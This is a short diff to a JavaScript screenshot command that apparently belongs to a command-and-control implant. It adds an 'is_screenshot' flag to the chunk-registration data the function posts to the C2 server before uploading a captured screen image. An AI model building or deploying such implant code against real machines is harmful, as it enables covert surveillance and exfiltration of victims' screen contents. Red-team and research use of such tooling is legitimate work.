@@ -16,7 +16,7 @@ exports.screenshot = function(task, command, params){
         let fileSize = parseInt(capture.length);
         // always round up to account for chunks that are < chunksize;
         let numOfChunks = Math.ceil(fileSize / chunkSize);
-        let registerData = {'total_chunks': numOfChunks, 'task': task.id};
+        let registerData = {'total_chunks': numOfChunks, 'task': task.id, "is_screenshot": true};
         let registerFile = C2.postResponse(task, registerData);
         if (registerFile['responses'][0]['status'] === "success"){
             let currentChunk = 1;
